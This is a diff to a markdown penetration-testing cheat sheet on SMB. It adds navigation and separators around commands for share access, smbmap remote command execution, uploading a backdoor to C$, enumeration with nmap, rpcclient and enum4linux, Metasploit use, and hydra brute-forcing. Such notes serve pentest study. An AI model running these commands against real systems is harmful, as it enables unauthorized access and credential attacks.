@@ -1,9 +1,27 @@
 # Sever Message Block (SMB)
 
+* [Connect to Share via Windows CLI](#connect-to-share-via-windows-cli)
+* [nmap](#nmap)
+* [smbmap](#smbmap)
+* [Metasploit](#metasploit)
+* [nmblookup](#nmblookup)
+* [smbclient](#smbclient)
+* [rpcclient](#rpcclient)
+* [enum4linux](#enum4linux)
+* [hydra](#hydra)
+* [References](#references)
+
+***********************************************************************
+Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
+Note: Bracket characters themselves [ ] require removal. See examples.
+***********************************************************************
+
 ## Connect to Share via Windows CLI
 ```
 net use z: \\[TARGET-IP]\c$ [PASSWORD] /user:[USERNAME]
 ```
+
+***********************************************************************
 
 ## nmap
 
@@ -56,6 +74,8 @@ nmap -p [PORT] --script=smb-enum-services --script-args smbsusername=[USERNAME],
 nmap -p [PORT] --script smb-os-discovery [TARGET-IP]
 ```
 
+***********************************************************************
+
 ## smbmap
 ```
 smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET-IP]
@@ -70,6 +90,8 @@ smbmap -u [USERNAME] -p "[PASSWORD]" -d . -H [TARGET-IP] -x [COMMAND-TO-RUN]
 * -r to look at contents: -r '[DRIVE-LETTER]'$ | Example: -r 'c$'
 * --upload '[FILE-PATH]' '[DESTINATION] | Example: --upload '/root/backdoor' 'C$\backdoor'
 * --download '[FILE-PATH]' | Example: --download 'C$\flag.txt'
+
+***********************************************************************
 
 ## Metasploit
 ```
@@ -99,10 +121,14 @@ show options
 exploit
 ```
 
+***********************************************************************
+
 ## nmblookup
 ```
 nmblookkup -A [TARGET-IP]
 ```
+
+***********************************************************************
 
 ## smbclient
 * Null login
@@ -119,6 +145,8 @@ smbclient -L [TARGET-IP] -U [USERNAME]
 ```
 smbclient //[TARGET-IP]/[SHARE] -U [USERNAME]
 ```
+
+***********************************************************************
 
 ## rpcclient
 ```
@@ -143,6 +171,8 @@ lookupnames [USERNAME]
 ```
 enumdomgroups
 ```
+
+***********************************************************************
 
 ## enum4linux
 * OS info
@@ -170,11 +200,14 @@ enum4linux -S [TARGET-IP]
 enum4linux -i [TARGET-IP]
 ```
 
+***********************************************************************
 
 ## hydra
 ```
 hydra -l [USERNAME] -P [PATH-TO-WORDLIST] [TARGET-IP] smb
 ```
+
+***********************************************************************
 
 ### References
 
